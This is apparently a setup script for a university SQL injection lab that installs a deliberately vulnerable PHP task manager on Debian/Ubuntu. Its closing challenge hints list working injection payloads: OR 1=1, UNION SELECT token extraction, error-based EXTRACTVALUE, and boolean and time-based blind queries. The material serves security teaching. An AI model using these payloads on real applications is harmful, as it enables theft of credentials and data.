#!/usr/bin/env bash
#
# DBS401 SQL Injection Playground — Automated Setup
# ==================================================
# Installs & configures everything needed to run the
# intentionally-vulnerable Task Manager on a fresh Debian/Ubuntu VM.
#
# Usage:  sudo bash setup.sh
#
set -euo pipefail

# ──────────────────────────────────────────────
# 0.  Configuration (EDIT THESE)
# ──────────────────────────────────────────────
REPO_URL="https://github.com/minhprovjp/task-manager.git"
REPO_BRANCH="main"
DB_NAME="task_manager"
DB_USER="taskmgr_user"
DB_PASS=""                              # auto-generated below if empty
SITE_DIR="/var/www/html/task-manager"

# ──────────────────────────────────────────────
# 1.  Preliminaries
# ──────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    echo "[-] This script must be run as root (sudo)."
    exit 1
fi

if [[ -z "${DB_PASS}" ]]; then
    DB_PASS="$(tr -dc 'a-zA-Z0-9' < /dev/urandom | fold -w 20 | head -n1)"
fi

echo "[*] DBS401 Playground Installer"
echo "[*] Target: ${SITE_DIR}"
echo ""

# ──────────────────────────────────────────────
# 2.  OS Detection & Package Helpers
# ──────────────────────────────────────────────
if grep -qiE 'debian|ubuntu' /etc/os-release 2>/dev/null; then
    PKG_MGR="apt-get"
else
    echo "[-] Unsupported OS – this script targets Debian / Ubuntu."
    exit 1
fi

pkg_installed() {
    dpkg-query -W -f='${Status}' "$1" 2>/dev/null | grep -q "install ok installed"
}

pkg_ensure() {
    local pkg="$1"
    if pkg_installed "${pkg}"; then
        echo "  [✔] ${pkg}  already installed"
    else
        echo "  [*] Installing ${pkg} ..."
        DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "${pkg}"
    fi
}

# ──────────────────────────────────────────────
# 3.  Install System Dependencies
# ──────────────────────────────────────────────
echo "[*] Updating package lists ..."
apt-get update -qq

echo "[*] Checking / installing dependencies ..."

# Apache
pkg_ensure "apache2"

# MariaDB server
if ! pkg_installed "mariadb-server" && ! pkg_installed "mysql-server"; then
    pkg_ensure "mariadb-server"
    pkg_ensure "mariadb-client"
else
    echo "  [✔] MySQL/MariaDB server  already installed"
fi

# PHP + Apache module + MySQL extension
pkg_ensure "php"
pkg_ensure "libapache2-mod-php"
pkg_ensure "php-mysql"

# Utilities
pkg_ensure "git"
pkg_ensure "unzip"

# ──────────────────────────────────────────────
# 4.  Ensure Services Are Running
# ──────────────────────────────────────────────
echo ""
echo "[*] Starting services ..."

if systemctl is-active --quiet apache2 2>/dev/null; then
    echo "  [✔] apache2  already running"
else
    systemctl start apache2
    echo "  [✔] apache2  started"
fi

if systemctl is-active --quiet mariadb 2>/dev/null; then
    echo "  [✔] mariadb  already running"
elif systemctl is-active --quiet mysql 2>/dev/null; then
    echo "  [✔] mysql  already running"
else
    systemctl start mariadb 2>/dev/null || systemctl start mysql 2>/dev/null
    echo "  [✔] mariadb/mysql  started"
fi

# ──────────────────────────────────────────────
# 5.  Clone / Update Source Code
# ──────────────────────────────────────────────
echo ""
echo "[*] Fetching source code from ${REPO_URL} ..."

if [[ -d "${SITE_DIR}" ]]; then
    echo "  [*] Directory exists — pulling latest ..."
    cd "${SITE_DIR}"
    git pull origin "${REPO_BRANCH}" 2>/dev/null || true
else
    git clone --branch "${REPO_BRANCH}" --depth 1 "${REPO_URL}" "${SITE_DIR}"
fi

# ──────────────────────────────────────────────
# 6.  Configure Database
# ──────────────────────────────────────────────
echo ""
echo "[*] Configuring database ..."

# Create database (idempotent)
mysql -u root -e "CREATE DATABASE IF NOT EXISTS \`${DB_NAME}\` CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;"

# Create application user
mysql -u root -e "CREATE USER IF NOT EXISTS '${DB_USER}'@'localhost' IDENTIFIED BY '${DB_PASS}';"
mysql -u root -e "GRANT ALL PRIVILEGES ON \`${DB_NAME}\`.* TO '${DB_USER}'@'localhost'; FLUSH PRIVILEGES;"

# Import schema & seed data
if [[ -f "${SITE_DIR}/task_manager.sql" ]]; then
    mysql -u root "${DB_NAME}" < "${SITE_DIR}/task_manager.sql"
    echo "  [✔] Schema imported"
else
    echo "  [!] task_manager.sql not found — skipping DB import"
fi

# ──────────────────────────────────────────────
# 7.  Write Application Configuration
# ──────────────────────────────────────────────
echo ""
echo "[*] Writing application config ..."

cat > "${SITE_DIR}/config/constants.php" <<CONFIGEOF
<?php
session_start();

define('LOCALHOST', 'localhost');
define('DB_USERNAME', '${DB_USER}');
define('DB_PASSWORD', '${DB_PASS}');
define('DB_NAME', '${DB_NAME}');

define('SITEURL', 'http://localhost/task-manager/');
CONFIGEOF

echo "  [✔] config/constants.php updated"

# ──────────────────────────────────────────────
# 8.  Set Permissions
# ──────────────────────────────────────────────
echo ""
echo "[*] Setting file permissions ..."
chown -R www-data:www-data "${SITE_DIR}"
find "${SITE_DIR}" -type d -exec chmod 755 {} \;
find "${SITE_DIR}" -type f -exec chmod 644 {} \;

# ──────────────────────────────────────────────
# 9.  Restart Apache
# ──────────────────────────────────────────────
echo ""
echo "[*] Restarting Apache ..."
systemctl restart apache2

# ──────────────────────────────────────────────
# 10. Summary
# ──────────────────────────────────────────────
LOCAL_URL="http://localhost/task-manager/"
echo ""
echo "╔═══════════════════════════════════════════════════════╗"
echo "║       DBS401 SQL Injection Playground — Ready!       ║"
echo "╚═══════════════════════════════════════════════════════╝"
echo ""
echo "  URL:  ${LOCAL_URL}"
echo ""
echo "  DB:   ${DB_NAME}  |  User: ${DB_USER}  |  Pass: ${DB_PASS}"
echo ""
echo "╔═══════════════════════════════════════════════════════╗"
echo "║  Challenge Hints                                      ║"
echo "╠═══════════════════════════════════════════════════════╣"
echo "║                                                       ║"
echo "║  Flag 1 (Easy  —  in-band numeric OR)                 ║"
echo "║    list-task.php?list_id=1 OR 1=1                     ║"
echo "║    → dumps ALL tasks including a hidden one with      ║"
echo "║      a secret in its description.                     ║"
echo "║                                                       ║"
echo "║  Flag 2 (Easy  —  in-band string OR)                  ║"
echo "║    search.php?q=' OR '1'='1                          ║"
echo "║    → dumps ALL tasks, revealing another hidden task.  ║"
echo "║                                                       ║"
echo "║  Flag 3 (Medium  —  UNION SELECT)                     ║"
echo "║    search.php?q=' UNION SELECT 1,username,token,4,5,6 ║"
echo "║      FROM tbl_users WHERE role='admin' -- -           ║"
echo "║    → extracts the admin API token.                    ║"
echo "║                                                       ║"
echo "║  Flag 4 (Medium  —  error-based EXTRACTVALUE)          ║"
echo "║    search.php?q=' OR EXTRACTVALUE(1,CONCAT(0x7e,      ║"
echo "║      (SELECT token FROM tbl_users WHERE username=     ║"
echo "║      'staff'))) OR '1'='1                             ║"
echo "║    → leaks the staff token in a MySQL XPATH error.    ║"
echo "║                                                       ║"
echo "║  Flag 5 (Hard  —  boolean blind)                      ║"
echo "║    user-check.php?id=1 AND (SELECT SUBSTRING(         ║"
echo "║      token,1,1) FROM tbl_users WHERE username=        ║"
echo "║      'staff')='D'                                     ║"
echo "║    → "User found" vs "User not found" oracle.         ║"
echo "║      Extract the staff token char by char.            ║"
echo "║                                                       ║"
echo "║  Flag 6 (Hard  —  time-based blind)                   ║"
echo "║    list-task.php?list_id=1 AND IF(                    ║"
echo "║      (SELECT SUBSTRING(token,N,1) FROM tbl_users      ║"
echo "║      WHERE username='staff')='X',SLEEP(2),0)          ║"
echo "║    → ~2s delay if char matches.                       ║"
echo "║      Extract the staff token char by char.            ║"
echo "║                                                       ║"
echo "╚═══════════════════════════════════════════════════════╝"
echo ""
echo "[✔] Setup complete."
